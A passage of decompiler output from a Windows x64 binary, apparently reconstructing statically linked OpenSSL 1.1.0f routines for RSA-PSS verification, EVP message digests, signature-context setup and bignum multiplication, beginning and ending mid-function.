  }
  v17 = v34;
  if ( (unsigned int)sub_14006DB20((__int64)v34, a3, 0i64)
    && (unsigned int)sub_14006DD90((__int64)v34)
    && (unsigned int)sub_14006DD90((__int64)v34)
    && (v18 == v32 || (unsigned int)sub_14006DD90((__int64)v34)) )
  {
    if ( (unsigned int)sub_14006DA80(v34, (__int64)Buf1, 0i64) )
    {
      if ( !memcmp(Buf1, Buf2, v35) )
        v7 = 1;
      else
        sub_140024610(4, 126, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_pss.c", 124);
    }
  }
LABEL_53:
  sub_14001D930(v8);
  sub_14006DF90(v17);
  return v7;
}
// 14006D779: conditional instruction was optimized away because ebp.4>=20
// 14006D773: mask 0x8000001F is shortened because ebp.4 <= 0x7FFFFFFF

//----- (000000014006D970) ----------------------------------------------------
void *__fastcall sub_14006D970(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5, __int64 a6)
{
  int v6; // eax
  void *result; // rax
  __int64 v12; // rbx
  unsigned int v13; // edi

  result = sub_14001DC20((unsigned int)(v6 + 16));
  v12 = (__int64)result;
  if ( result )
  {
    v13 = 1;
    sub_1400252B0((__int64)result, 1);
    if ( !(unsigned int)sub_14006DB20(v12, a5, a6)
      || !(*(unsigned int (__fastcall **)(__int64, __int64, __int64))(v12 + 40))(v12, a1, a2)
      || !(unsigned int)sub_14006DA80((__int64 *)v12, a3, a4) )
    {
      v13 = 0;
    }
    sub_14006E000(v12);
    sub_14001D930((void *)v12);
    return (void *)v13;
  }
  return result;
}
// 14006D9A3: variable 'v6' is possibly undefined

//----- (000000014006DA40) ----------------------------------------------------
__int64 __fastcall sub_14006DA40(__int64 *a1, __int64 a2, _DWORD *a3)
{
  unsigned int v4; // ebx

  v4 = sub_14006DA80(a1, a2, a3);
  sub_14006E000((__int64)a1);
  return v4;
}

//----- (000000014006DA80) ----------------------------------------------------
__int64 __fastcall sub_14006DA80(__int64 *a1, __int64 a2, _DWORD *a3)
{
  unsigned int v5; // esi
  void (__fastcall *v6)(__int64 *); // rdx

  if ( *(int *)(*a1 + 8) > 64 )
    sub_1400234A0(
      "assertion failed: ctx->digest->md_size <= EVP_MAX_MD_SIZE",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c",
      165i64);
  v5 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 32))(a1, a2);
  if ( a3 )
    *a3 = *(_DWORD *)(*a1 + 8);
  v6 = *(void (__fastcall **)(__int64 *))(*a1 + 48);
  if ( v6 )
  {
    v6(a1);
    sub_1400252B0((__int64)a1, 2);
  }
  sub_140023440(a1[3], *(int *)(*a1 + 60));
  return v5;
}

//----- (000000014006DB20) ----------------------------------------------------
__int64 __fastcall sub_14006DB20(__int64 a1, int *a2, __int64 a3)
{
  int v3; // eax
  __int64 v7; // rcx
  int *v9; // rax
  bool v10; // zf
  void *v11; // rax
  __int64 *v12; // rcx
  int v13; // eax

  sub_140025290(a1, v3 - 46);
  v7 = *(_QWORD *)(a1 + 8);
  if ( !v7 || !*(_QWORD *)a1 || a2 && *a2 != **(_DWORD **)a1 )
  {
    if ( a2 )
    {
      sub_140025890(v7);
      if ( a3 )
      {
        if ( !(unsigned int)sub_140025980(a3) )
        {
          sub_140024610(6, 128, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 83);
          return 0i64;
        }
      }
      else
      {
        a3 = sub_14005C210(*a2);
      }
      if ( a3 )
      {
        a2 = (int *)sub_14005C1B0(a3, *a2);
        if ( !a2 )
        {
          sub_140024610(6, 128, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 95);
          sub_140025890(a3);
          return 0i64;
        }
        *(_QWORD *)(a1 + 8) = a3;
      }
      else
      {
        *(_QWORD *)(a1 + 8) = 0i64;
      }
    }
    else
    {
      a2 = *(int **)a1;
      if ( !*(_QWORD *)a1 )
      {
        sub_140024610(6, 128, 139, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 110);
        return 0i64;
      }
    }
    v9 = *(int **)a1;
    if ( *(int **)a1 != a2 )
    {
      if ( v9 && v9[15] )
      {
        sub_14001DA40(*(void **)(a1 + 24), v9[15], (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 0x76u);
        *(_QWORD *)(a1 + 24) = 0i64;
      }
      v10 = (*(_DWORD *)(a1 + 16) & 0x100) == 0;
      *(_QWORD *)a1 = a2;
      if ( v10 )
      {
        if ( a2[15] )
        {
          *(_QWORD *)(a1 + 40) = *((_QWORD *)a2 + 3);
          v11 = sub_14001DC20(a2[15]);
          *(_QWORD *)(a1 + 24) = v11;
          if ( !v11 )
          {
            sub_140024610(6, 128, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 126);
            return 0i64;
          }
        }
      }
    }
  }
  v12 = *(__int64 **)(a1 + 32);
  if ( v12 )
  {
    v13 = sub_140020440(v12, -1, 248, 7u, 0, a1);
    if ( v13 <= 0 && v13 != -2 )
      return 0i64;
  }
  if ( (*(_DWORD *)(a1 + 16) & 0x100) != 0 )
    return 1i64;
  else
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 16i64))(a1);
}
// 14006DB3E: variable 'v3' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014006DD90) ----------------------------------------------------
__int64 __fastcall sub_14006DD90(__int64 a1)
{
  return (*(__int64 (**)(void))(a1 + 40))();
}

//----- (000000014006DDB0) ----------------------------------------------------
__int64 __fastcall sub_14006DDB0(_QWORD *a1, __int64 a2)
{
  __int64 v4; // rcx
  __int64 v6; // rsi
  size_t v7; // rcx
  __int64 v8; // rcx
  _QWORD *v9; // rax
  void *v10; // rax
  __int64 (__fastcall *v11)(_QWORD *, __int64); // r8

  if ( a2 && *(_QWORD *)a2 )
  {
    v4 = *(_QWORD *)(a2 + 8);
    if ( v4 && !(unsigned int)sub_140025980(v4) )
    {
      sub_140024610(6, 110, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 193);
      return 0i64;
    }
    if ( *a1 == *(_QWORD *)a2 )
    {
      v6 = a1[3];
      sub_1400252B0((__int64)a1, 4);
    }
    else
    {
      v6 = 0i64;
    }
    sub_14006E000((__int64)a1);
    *(_OWORD *)a1 = *(_OWORD *)a2;
    *((_OWORD *)a1 + 1) = *(_OWORD *)(a2 + 16);
    *((_OWORD *)a1 + 2) = *(_OWORD *)(a2 + 32);
    a1[3] = 0i64;
    a1[4] = 0i64;
    if ( *(_QWORD *)(a2 + 24) )
    {
      v7 = *(int *)(*a1 + 60i64);
      if ( (_DWORD)v7 )
      {
        if ( v6 )
        {
          a1[3] = v6;
        }
        else
        {
          v10 = sub_14001D8E0(v7);
          a1[3] = v10;
          if ( !v10 )
          {
            sub_140024610(6, 110, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 219);
            return 0i64;
          }
        }
        memmove((void *)a1[3], *(const void **)(a2 + 24), *(int *)(*a1 + 60i64));
      }
    }
    a1[5] = *(_QWORD *)(a2 + 40);
    v8 = *(_QWORD *)(a2 + 32);
    if ( !v8 || (v9 = sub_140020560(v8), (a1[4] = v9) != 0i64) )
    {
      v11 = *(__int64 (__fastcall **)(_QWORD *, __int64))(*a1 + 40i64);
      if ( v11 )
        return v11(a1, a2);
      else
        return 1i64;
    }
    else
    {
      sub_14006E000((__int64)a1);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(6, 110, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c", 187);
    return 0i64;
  }
}

//----- (000000014006DF90) ----------------------------------------------------
void __fastcall sub_14006DF90(void *a1)
{
  sub_14006E000((__int64)a1);
  sub_14001D930(a1);
}

//----- (000000014006DFD0) ----------------------------------------------------
void *__fastcall sub_14006DFD0()
{
  int v0; // eax

  return sub_14001DC20((unsigned int)(v0 + 8));
}
// 14006DFE8: variable 'v0' is possibly undefined

//----- (000000014006E000) ----------------------------------------------------
__int64 __fastcall sub_14006E000(__int64 a1)
{
  if ( a1 )
  {
    if ( *(_QWORD *)a1 )
    {
      if ( *(_QWORD *)(*(_QWORD *)a1 + 48i64) && !(unsigned int)sub_1400252C0(a1, 2u) )
        (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 48i64))(a1);
      if ( *(_QWORD *)a1
        && *(_DWORD *)(*(_QWORD *)a1 + 60i64)
        && *(_QWORD *)(a1 + 24)
        && !(unsigned int)sub_1400252C0(a1, 4u) )
      {
        sub_14001DA40(
          *(void **)(a1 + 24),
          *(int *)(*(_QWORD *)a1 + 60i64),
          (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\digest.c",
          0x21u);
      }
    }
    sub_140020670(*(_QWORD **)(a1 + 32));
    sub_140025890(*(_QWORD *)(a1 + 8));
    sub_140023440(a1, 48i64);
  }
  return 1i64;
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014006E0B0) ----------------------------------------------------
_QWORD *__fastcall sub_14006E0B0(__int64 a1, __int64 a2, _QWORD *a3)
{
  __int64 *v3; // rsi
  __int64 v7; // rdi
  _QWORD *result; // rax
  bool v9; // zf
  __int64 v10; // rcx
  _QWORD *v11; // rdi
  unsigned int v12; // ebx
  __int64 (__fastcall *v13)(__int64 *, _QWORD, _QWORD *, __int64); // rdi
  unsigned int v14; // esi
  __int64 *v15; // rax
  __int64 *v16; // rbp
  unsigned int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20[4]; // [rsp+30h] [rbp-88h] BYREF
  char v21[64]; // [rsp+40h] [rbp-78h] BYREF

  v3 = *(__int64 **)(a1 + 32);
  v7 = *v3;
  if ( (*(_BYTE *)(*v3 + 4) & 4) == 0 )
  {
    v13 = *(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD *, __int64))(v7 + 120);
    if ( a2 )
    {
      v9 = (*(_DWORD *)(a1 + 16) & 0x200) == 0;
      v20[0] = 0;
      if ( v9 )
      {
        v15 = (__int64 *)sub_14006DFD0();
        v16 = v15;
        if ( !v15 || !(unsigned int)sub_14006DDB0(v15, a1) )
          return 0i64;
        if ( v13 )
          v17 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD *, __int64 *))(*(_QWORD *)v16[4] + 120i64))(
                  v16[4],
                  a2,
                  a3,
                  v16);
        else
          v17 = sub_14006DA80(v16, (__int64)v21, v20);
        v14 = v17;
        sub_14006DF90(v16);
      }
      else if ( v13 )
      {
        v14 = (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD *, __int64))(*v3 + 120))(v3, a2, a3, a1);
      }
      else
      {
        v14 = sub_14006DA80((__int64 *)a1, (__int64)v21, v20);
      }
      if ( v13 || !v14 )
        return (_QWORD *)v14;
      v18 = sub_140021070(*(__int64 **)(a1 + 32), a2, a3, (__int64)v21, (unsigned int)v20[0]);
    }
    else
    {
      if ( !v13 )
      {
        v19 = sub_1400253D0(*(_QWORD *)a1);
        return (_QWORD *)(v19 >= 0 && (int)sub_140021070(v3, 0i64, a3, 0i64, v19) > 0);
      }
      v18 = v13(v3, 0i64, a3, a1);
    }
    return (_QWORD *)(v18 > 0);
  }
  if ( !a2 )
    return (_QWORD *)(*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD *, __int64))(v7 + 120))(
                       *(_QWORD *)(a1 + 32),
                       0i64,
                       a3,
                       a1);
  v9 = (*(_DWORD *)(a1 + 16) & 0x200) == 0;
  v10 = *(_QWORD *)(a1 + 32);
  if ( !v9 )
    return (_QWORD *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD *, __int64))(v7 + 120))(v10, a2, a3, a1);
  result = sub_140020560(v10);
  v11 = result;
  if ( result )
  {
    v12 = (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD *, __int64))(*result + 120i64))(result, a2, a3, a1);
    sub_140020670(v11);
    return (_QWORD *)v12;
  }
  return result;
}

//----- (000000014006E290) ----------------------------------------------------
__int64 __fastcall sub_14006E290(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5)
{
  return sub_14006E420(a1, a2, a3, a4, a5, 0);
}

//----- (000000014006E2C0) ----------------------------------------------------
__int64 __fastcall sub_14006E2C0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rcx
  unsigned int v5; // r15d
  __int64 (__fastcall *v7)(__int64, __int64, __int64, __int64); // rsi
  unsigned int v8; // edi
  __int64 *v9; // rax
  __int64 *v10; // rbx
  unsigned int v11; // eax
  int v13[4]; // [rsp+30h] [rbp-88h] BYREF
  char v14[64]; // [rsp+40h] [rbp-78h] BYREF

  v13[0] = 0;
  v4 = *(_QWORD *)(a1 + 32);
  v5 = a3;
  v7 = *(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v4 + 136i64);
  if ( (*(_DWORD *)(a1 + 16) & 0x200) != 0 )
  {
    if ( v7 )
      v8 = v7(v4, a2, a3, a1);
    else
      v8 = sub_14006DA80((__int64 *)a1, (__int64)v14, v13);
  }
  else
  {
    v9 = (__int64 *)sub_14006DFD0();
    v10 = v9;
    if ( !v9 || !(unsigned int)sub_14006DDB0(v9, a1) )
      return 0xFFFFFFFFi64;
    if ( v7 )
      v11 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64 *))(*(_QWORD *)v10[4] + 136i64))(
              v10[4],
              a2,
              v5,
              v10);
    else
      v11 = sub_14006DA80(v10, (__int64)v14, v13);
    v8 = v11;
    sub_14006DF90(v10);
  }
  if ( v7 || !v8 )
    return v8;
  else
    return sub_140021240(*(_DWORD **)(a1 + 32));
}

//----- (000000014006E3F0) ----------------------------------------------------
__int64 __fastcall sub_14006E3F0(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5)
{
  return sub_14006E420(a1, a2, a3, a4, a5, 1);
}

//----- (000000014006E420) ----------------------------------------------------
__int64 __fastcall sub_14006E420(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5, int a6)
{
  __int64 v7; // rsi
  __int64 v11; // rax
  char *v12; // rax
  __int64 *v14; // rcx
  __int64 v15; // rax
  int (__fastcall *v16)(__int64 *, __int64); // r8
  int (__fastcall *v17)(__int64 *, __int64); // r8
  unsigned int v18; // esi
  unsigned int v19; // [rsp+50h] [rbp+8h] BYREF

  v7 = a5;
  if ( !*(_QWORD *)(a1 + 32) )
    *(_QWORD *)(a1 + 32) = sub_140020770(a5, a4);
  v11 = *(_QWORD *)(a1 + 32);
  if ( !v11 )
    return 0i64;
  if ( (*(_BYTE *)(*(_QWORD *)v11 + 4i64) & 4) == 0 && !a3 )
  {
    if ( (int)sub_14001D4B0(v7, (__int64)&v19) <= 0
      || (v12 = sub_14002C1A0(v19), (a3 = (int *)sub_14001E990((__int64)v12)) == 0i64) )
    {
      sub_140024610(6, 161, 158, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\m_sigver.c", 36);
      return 0i64;
    }
  }
  v14 = *(__int64 **)(a1 + 32);
  v15 = *v14;
  if ( a6 )
  {
    v16 = *(int (__fastcall **)(__int64 *, __int64))(v15 + 128);
    if ( v16 )
    {
      if ( v16(v14, a1) <= 0 )
        return 0i64;
      *(_DWORD *)(*(_QWORD *)(a1 + 32) + 32i64) = 128;
    }
    else if ( (int)sub_1400212D0(v14) <= 0 )
    {
      return 0i64;
    }
  }
  else
  {
    v17 = *(int (__fastcall **)(__int64 *, __int64))(v15 + 112);
    if ( v17 )
    {
      if ( v17(v14, a1) <= 0 )
        return 0i64;
      *(_DWORD *)(*(_QWORD *)(a1 + 32) + 32i64) = 64;
    }
    else if ( (int)sub_1400211C0(v14) <= 0 )
    {
      return 0i64;
    }
  }
  v18 = 0;
  if ( (int)sub_140020440(*(__int64 **)(a1 + 32), -1, 248, 1u, 0, (__int64)a3) <= 0 )
    return 0i64;
  if ( a2 )
    *a2 = *(_QWORD *)(a1 + 32);
  if ( (*(_BYTE *)(**(_QWORD **)(a1 + 32) + 4i64) & 4) != 0 )
    return 1i64;
  LOBYTE(v18) = (unsigned int)sub_14006DB20(a1, a3, a4) != 0;
  return v18;
}

//----- (000000014006E5B0) ----------------------------------------------------
__int64 __fastcall sub_14006E5B0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned __int64 v4; // rdi
  char v5; // r14
  unsigned __int64 v6; // rsi
  char **v11; // rbx
  int v12; // ebp
  char *v13; // rcx
  int v14; // r14d
  __int64 *v15; // rbp
  char *v16; // rcx
  unsigned int v17; // ebx
  int v19; // [rsp+90h] [rbp+18h]

  v4 = *(int *)(a2 + 8);
  v5 = 0;
  v6 = *(int *)(a3 + 8);
  if ( (_DWORD)v4 && (_DWORD)v6 )
  {
    v19 = v6 + v4;
    sub_140027D40(a4);
    if ( a1 == a2 || a1 == a3 )
    {
      v11 = (char **)sub_140027C40(a4);
      if ( !v11 )
        goto LABEL_32;
    }
    else
    {
      v11 = (char **)a1;
    }
    v12 = v4 - v6;
    if ( (_DWORD)v4 == (_DWORD)v6 && (_DWORD)v4 == 8 )
    {
      if ( !sub_140027B30((__int64)v11, v12 + 16) )
        goto LABEL_32;
      v13 = *v11;
      *((_DWORD *)v11 + 2) = 16;
      sub_1400715D0((unsigned __int64 *)v13, *(unsigned __int64 **)a2, *(_QWORD **)a3);
    }
    else if ( (int)v4 < 16 || (int)v6 < 16 || (unsigned int)(v12 + 1) > 2 )
    {
      if ( !sub_140027B30((__int64)v11, v19) )
        goto LABEL_32;
      v16 = *v11;
      *((_DWORD *)v11 + 2) = v19;
      sub_14006E870(v16, *(char **)a2, v4, *(unsigned __int64 **)a3, v6);
    }
    else
    {
      if ( v12 >= 0 )
        v5 = sub_1400272A0(v4);
      if ( v12 == -1 )
        v5 = sub_1400272A0(v6);
      v14 = 1 << (v5 - 1);
      v15 = sub_140027C40(a4);
      if ( !v15 )
        goto LABEL_32;
      if ( (int)v4 > v14 || (int)v6 > v14 )
      {
        if ( !sub_140027B30((__int64)v15, 8 * v14) || !sub_140027B30((__int64)v11, 8 * v14) )
          goto LABEL_32;
        sub_14006E9A0(*v11, *(char **)a2, *(unsigned __int64 **)a3, v14, v4 - v14, v6 - v14, *v15);
        *((_DWORD *)v11 + 2) = v19;
      }
      else
      {
        if ( !sub_140027B30((__int64)v15, 4 * v14) || !sub_140027B30((__int64)v11, 4 * v14) )
          goto LABEL_32;
        sub_14006F030(
          (unsigned __int64 *)*v11,
          *(unsigned __int64 **)a2,
          *(unsigned __int64 **)a3,
          v14,
          v4 - v14,
          v6 - v14,
          *v15);
        *((_DWORD *)v11 + 2) = v19;
      }
    }
    *((_DWORD *)v11 + 4) = *(_DWORD *)(a3 + 16) ^ *(_DWORD *)(a2 + 16);
    sub_1400278D0((__int64)v11);
    if ( (char **)a1 == v11 || sub_140026E90(a1, (__int64)v11) )
    {
      v17 = 1;
LABEL_33:
      sub_140027B60((__int64)a4);
      return v17;
    }
LABEL_32:
    v17 = 0;
    goto LABEL_33;
  }
  sub_140027560(a1, 0i64);
  return 1i64;
}

//----- (000000014006E870) ----------------------------------------------------
unsigned __int64 __fastcall sub_14006E870(char *a1, char *a2, int a3, unsigned __int64 *a4, int a5)
{
  int v5; // ebx
  unsigned __int64 *v6; // r14
  int v7; // edi
  char *v8; // r15
  unsigned __int64 *v10; // rsi
  unsigned __int64 result; // rax
  int v12; // ebx
  unsigned __int64 *v13; // rsi
  unsigned __int64 *v14; // r14
  char *v15; // rbp
  int v16; // ebx
  int v17; // ebx
  int v18; // ebx

  v5 = a5;
  v6 = a4;
  v7 = a3;
  v8 = a2;
  if ( a3 < a5 )
  {
    v7 = a5;
    v6 = (unsigned __int64 *)a2;
    v5 = a3;
    v8 = (char *)a4;
  }
  v10 = (unsigned __int64 *)&a1[8 * v7];
  if ( v5 <= 0 )
    return sub_140073520(a1, v8, v7, 0i64);
  result = sub_140073520(a1, v8, v7, *v6);
  v12 = v5 - 1;
  *v10 = result;
  if ( v12 > 0 )
  {
    v13 = v10 + 2;
    v14 = v6 + 2;
    v15 = a1 + 16;
    do
    {
      result = sub_140070B50(v15 - 8, v8, v7, *(v14 - 1));
      v16 = v12 - 1;
      *(v13 - 1) = result;
      if ( v16 <= 0 )
        break;
      result = sub_140070B50(v15, v8, v7, *v14);
      v17 = v16 - 1;
      *v13 = result;
      if ( v17 <= 0 )
        break;
      result = sub_140070B50(v15 + 8, v8, v7, v14[1]);
      v18 = v17 - 1;
      v13[1] = result;
      if ( v18 <= 0 )
        break;
      result = sub_140070B50(v15 + 16, v8, v7, v14[2]);
      v13[2] = result;
      v14 += 4;
      v13 += 4;
      v15 += 32;
      v12 = v18 - 1;
    }
    while ( v12 > 0 );
  }
  return result;
}

//----- (000000014006E9A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14006E9A0(char *a1, char *a2, unsigned __int64 *a3, int a4, int a5, int a6, __int64 a7)
{
  __int64 v7; // rbp
  unsigned __int64 result; // rax
  int v9; // ebx
  unsigned __int64 *v10; // rbx
  char *v11; // rsi
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // eax
  int v16; // ebx
  int v17; // r9d
  int v18; // ebx
  int v19; // ebx
  unsigned __int64 *v20; // r8
  unsigned __int64 v21; // rcx
  bool v22; // zf
  int Size; // [rsp+40h] [rbp-68h]
  size_t Sizea; // [rsp+40h] [rbp-68h]
  unsigned __int64 *Sizec; // [rsp+40h] [rbp-68h]
  size_t Sized; // [rsp+40h] [rbp-68h]
  char *Sizeb; // [rsp+40h] [rbp-68h]
  int v28; // [rsp+48h] [rbp-60h]
  int v29; // [rsp+48h] [rbp-60h]
  char *v30; // [rsp+50h] [rbp-58h]
  char *v31; // [rsp+58h] [rbp-50h]
  __int64 v32; // [rsp+60h] [rbp-48h]
  __int64 v33; // [rsp+68h] [rbp-40h]
  char *v34; // [rsp+70h] [rbp-38h]
  int v38; // [rsp+C8h] [rbp+20h]

  v7 = a4;
  if ( a4 < 8 )
    return sub_14006E870(a1, a2, a4 + a5, a3, a4 + a6);
  v32 = 8i64 * a4;
  Size = a4 - a5;
  v31 = &a2[v32];
  v9 = sub_140027770((__int64)a2, (__int64)&a2[v32], a5, a4 - a5);
  v28 = a6 - v7;
  v38 = 0;
  v30 = (char *)&a3[v7];
  switch ( (unsigned int)sub_140027770((__int64)v30, (__int64)a3, a6, a6 - (int)v7) + 4 + 3 * v9 )
  {
    case 0u:
      v10 = (unsigned __int64 *)a7;
      sub_14006F5F0((char *)a7, v31, a2, a5, a5 - v7);
      sub_14006F5F0((char *)(a7 + v32), (char *)a3, v30, a6, v7 - a6);
      break;
    case 1u:
    case 2u:
      v10 = (unsigned __int64 *)a7;
      sub_14006F5F0((char *)a7, v31, a2, a5, a5 - v7);
      sub_14006F5F0((char *)(a7 + v32), v30, (char *)a3, a6, v28);
      v38 = 1;
      break;
    case 3u:
    case 4u:
    case 5u:
    case 6u:
      v10 = (unsigned __int64 *)a7;
      sub_14006F5F0((char *)a7, a2, v31, a5, Size);
      sub_14006F5F0((char *)(a7 + v32), (char *)a3, v30, a6, v7 - a6);
      v38 = 1;
      break;
    case 7u:
    case 8u:
      v10 = (unsigned __int64 *)a7;
      sub_14006F5F0((char *)a7, a2, v31, a5, Size);
      sub_14006F5F0((char *)(a7 + v32), v30, (char *)a3, a6, v28);
      break;
    default:
      v10 = (unsigned __int64 *)a7;
      break;
  }
  if ( (_DWORD)v7 == 8 )
  {
    v34 = (char *)(a7 + 128);
    sub_1400715D0((unsigned __int64 *)(a7 + 128), (unsigned __int64 *)a7, (_QWORD *)(a7 + v32));
    sub_1400715D0((unsigned __int64 *)a1, (unsigned __int64 *)a2, a3);
    sub_14006E870(a1 + 128, v31, a5, (unsigned __int64 *)v30, a6);
    memset(&a1[8 * a6 + 128 + 8 * a5], 0, 8i64 * (16 - a5 - a6));
    v10 = (unsigned __int64 *)a7;
    v11 = a1 + 128;
  }
  else
  {
    Sizea = 16i64 * (_DWORD)v7;
    v33 = (__int64)&v10[4 * (int)v7];
    v34 = (char *)&v10[Sizea / 8];
    sub_14006F030(&v10[Sizea / 8], v10, &v10[(unsigned __int64)v32 / 8], v7, 0, 0, v33);
    sub_14006F030((unsigned __int64 *)a1, (unsigned __int64 *)a2, a3, v7, 0, 0, v33);
    v12 = a5;
    v29 = (int)v7 / 2;
    v13 = (int)v7 / 2;
    if ( a5 <= a6 )
      v12 = a6;
    v14 = v12 - v13;
    if ( v14 )
    {
      if ( v14 <= 0 )
      {
        Sizeb = &a1[Sizea];
        memset(Sizeb, 0, 16i64 * (_DWORD)v7);
        if ( a5 >= 16 || a6 >= 16 )
        {
          v15 = v29 / 2;
          if ( v29 / 2 >= a5 )
          {
            while ( v15 >= a6 )
            {
              if ( v15 == a5 || v15 == a6 )
              {
                v11 = Sizeb;
                sub_14006F030(
                  (unsigned __int64 *)Sizeb,
                  (unsigned __int64 *)v31,
                  (unsigned __int64 *)v30,
                  v15,
                  a5 - v15,
                  a6 - v15,
                  v33);
                goto LABEL_26;
              }
              v15 /= 2;
              if ( v15 < a5 )
                break;
            }
          }
          v11 = Sizeb;
          sub_14006E9A0((_DWORD)Sizeb, (_DWORD)v31, (_DWORD)v30, v15, a5 - v15, a6 - v15, v33);
        }
        else
        {
          v11 = Sizeb;
          sub_14006E870(Sizeb, v31, a5, (unsigned __int64 *)v30, a6);
        }
      }
      else
      {
        Sized = (size_t)&a1[Sizea];
        sub_14006E9A0(Sized, (_DWORD)v31, (_DWORD)v30, v13, a5 - v13, a6 - v13, v33);
        memset(&a1[16 * (int)v7 + 8 * a6 + 8 * a5], 0, 8i64 * (2 * (int)v7 - a5 - a6));
        v11 = (char *)Sized;
      }
    }
    else
    {
      Sizec = (unsigned __int64 *)&a1[Sizea];
      sub_14006F030(Sizec, (unsigned __int64 *)v31, (unsigned __int64 *)v30, v13, a5 - v13, a6 - v13, v33);
      memset(&a1[16 * v29 + 16 * (int)v7], 0, 8i64 * (2 * (int)v7 - 2 * v29));
      v11 = (char *)Sizec;
    }
  }
LABEL_26:
  v16 = sub_140070880((char *)v10, a1, v11, 2 * (int)v7);
  v17 = 2 * v7;
  if ( v38 )
    v18 = v16 - sub_140075060(v34, (char *)a7, v34, v17);
  else
    v18 = sub_140070880(v34, v34, (char *)a7, v17) + v16;
  result = sub_140070880(&a1[v32], &a1[v32], v34, 2 * (int)v7);
  v19 = result + v18;
  if ( v19 )
  {
    result = (unsigned __int64)a1;
    v20 = (unsigned __int64 *)&a1[24 * (_DWORD)v7];
    v21 = v19 + *v20;
    *v20 = v21;
    if ( v21 < v19 )
    {
      do
      {
        v22 = v20[1]++ == -1i64;
        ++v20;
      }
      while ( v22 );
    }
  }
  return result;
}

//----- (000000014006F030) ----------------------------------------------------
unsigned __int64 __fastcall sub_14006F030(
        unsigned __int64 *a1,
        unsigned __int64 *a2,
        unsigned __int64 *a3,
        int a4,
        int a5,
        int a6,
        __int64 a7)
{
  __int64 v9; // rsi
  int v10; // eax
  int v11; // edx
  unsigned __int64 result; // rax
  int v13; // ebx
  int v14; // r8d
  int v15; // ebx
  _QWORD *v16; // rbx
  int v17; // eax
  int v18; // edi
  int v19; // edi
  unsigned __int64 *v20; // r8
  unsigned __int64 v21; // rcx
  bool v22; // zf
  char *v23; // [rsp+40h] [rbp-58h]
  __int64 v24; // [rsp+40h] [rbp-58h]
  __int64 v25; // [rsp+40h] [rbp-58h]
  int v26; // [rsp+48h] [rbp-50h]
  int v27; // [rsp+4Ch] [rbp-4Ch]
  int v28; // [rsp+50h] [rbp-48h]
  char *v29; // [rsp+50h] [rbp-48h]
  int v30; // [rsp+58h] [rbp-40h]
  __int64 v31; // [rsp+58h] [rbp-40h]
  int v32; // [rsp+60h] [rbp-38h]
  __int64 v33; // [rsp+68h] [rbp-30h]
  char *v34; // [rsp+70h] [rbp-28h]

  v9 = a4;
  v10 = a4 / 2;
  v26 = a4 / 2;
  v11 = a4 / 2 + a5;
  v30 = v11;
  v27 = a4 / 2 + a6;
  if ( a4 == 8 )
  {
    if ( !a5 && !a6 )
      return sub_1400715D0(a1, a2, a3);
    goto LABEL_6;
  }
  if ( a4 < 16 )
  {
LABEL_6:
    sub_14006E870((char *)a1, (char *)a2, a4 + a5, a3, a4 + a6);
    result = (unsigned int)(a5 + a6);
    if ( (result & 0x80000000) != 0i64 )
      return (unsigned __int64)memset(&a1[2 * (int)v9 + a6 + a5], 0, 8i64 * -(int)result);
    return result;
  }
  v28 = v10 - v11;
  v33 = v10;
  v23 = (char *)&a2[v33];
  v13 = sub_140027770((__int64)a2, (__int64)&a2[v33], v11, v10 - v11);
  v34 = (char *)&a3[v33];
  v32 = 0;
  switch ( (unsigned int)sub_140027770((__int64)&a3[v33], (__int64)a3, v27, a6) + 4 + 3 * v13 )
  {
    case 0u:
      sub_14006F5F0((char *)a7, v23, (char *)a2, v30, a5);
      sub_14006F5F0((char *)(a7 + v33 * 8), (char *)a3, v34, v27, v26 - v27);
      goto LABEL_10;
    case 1u:
    case 3u:
    case 4u:
    case 5u:
    case 7u:
      v14 = 1;
      goto LABEL_11;
    case 2u:
      sub_14006F5F0((char *)a7, v23, (char *)a2, v30, a5);
      v15 = a6;
      sub_14006F5F0((char *)(a7 + v33 * 8), v34, (char *)a3, v27, a6);
      v14 = 0;
      v32 = 1;
      goto LABEL_12;
    case 6u:
      sub_14006F5F0((char *)a7, (char *)a2, v23, v30, v28);
      sub_14006F5F0((char *)(a7 + v33 * 8), (char *)a3, v34, v27, v26 - v27);
